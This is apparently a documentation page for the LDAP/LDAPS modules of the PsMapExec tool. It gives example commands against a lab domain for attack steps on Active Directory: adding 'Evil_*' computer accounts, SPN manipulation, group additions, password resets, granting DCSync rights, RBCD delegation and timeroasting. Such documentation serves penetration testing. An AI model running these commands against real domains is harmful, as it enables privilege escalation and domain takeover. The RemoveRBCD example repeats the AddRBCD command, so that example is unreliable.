# LDAP / LDAPS 

The following modules below are all exclusive to the LDAP or LDAPS method within PsMapExec.

# Example Usage

    PsMapExec LDAP -Targets DC01.security.local -Module "<ModuleName>"

# Machine Account Quota (MAQ)

Gets the domain Machine Account Quota value.

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!"  -Module MAQ

# AddComputer

Adds a new computer account to the domain

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!"  -Module addcomputer

# AddSPN

Adds a new random SPN to the target account

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module AddSPN -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# RemoveSPN

Removes ALL SPNs from the target account

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module RemoveSPN -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# AddToGroup

Adds a specified object to a group

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module AddToGroup -GroupDN "CN=Spicy_Admins,CN=Users,DC=SECURITY,DC=LOCAL" -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# RemoveFromGroup

Removes a specified object from a group

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module RemoveFromGroup -GroupDN "CN=Spicy_Admins,CN=Users,DC=SECURITY,DC=LOCAL" -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# ToggleAccount

Enables / Disabled the specified user or computer account

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module ToggleAccount -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# ResetPassword

Resets the password of the account to a random value

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module ResetPassword -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# AddComputer

Adds a new computer account "Evil_*" to the domain with a random value password

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module AddComputer

# RemoveComputer

Removes the specified computer account from the domain

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module RemoveComputer

# Elevate

Elevates the specified account to perform DcSync within the domain

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module Elevate -TargetDN "CN=Moe,CN=Users,DC=SECURITY,DC=LOCAL"

# AddRBCD

Grant a trustee (-SID S-1-5-21-55... ) ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity to the specified account

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module AddRBCD -TargetDN "CN=MSSQL01,CN=Computers,DC=SECURITY,DC=LOCAL" -SID "S-1-5-21-557848230-2785663121-4227600060-1105"

# RemoveRBCD

Clears the ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity attribute the for target

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module AddRBCD -TargetDN "CN=MSSQL01,CN=Computers,DC=SECURITY,DC=LOCAL" -SID "S-1-5-21-557848230-2785663121-4227600060-1105"

# Timeroast

Performs authenticated timeroasting.

    PsMapExec ldap -Targets DC01 -Username Arbiter -Password "Password123!" -Module timeroast -ShowOutput
